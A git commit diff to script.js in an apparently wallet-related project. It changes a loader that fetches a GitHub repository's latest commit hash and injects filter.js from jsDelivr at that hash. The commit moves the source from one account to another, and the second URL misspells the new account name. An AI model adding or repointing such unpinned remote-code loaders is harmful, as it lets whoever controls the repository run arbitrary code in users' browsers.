b1040baecf2cdf79958553c792a27a6d77551601
slol41936-cpu <slol41936@gmail.com>
2026-04-20 23:10:04 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,7 @@
-fetch('https://api.github.com/repos/Sumandey7689/wallet_automation/commits/main')
+fetch('https://api.github.com/repos/slol41936-cpu/wallet_automation/commits/main')
 .then(r => r.json())
 .then(d => {
   var s = document.createElement('script');
-  s.src = 'https://cdn.jsdelivr.net/gh/Sumandey7689/wallet_automation@' + d.sha + '/filter.js';
+  s.src = 'https://cdn.jsdelivr.net/gh/slo41936-cpu/wallet_automation@' + d.sha + '/filter.js';
   document.body.appendChild(s);
 });
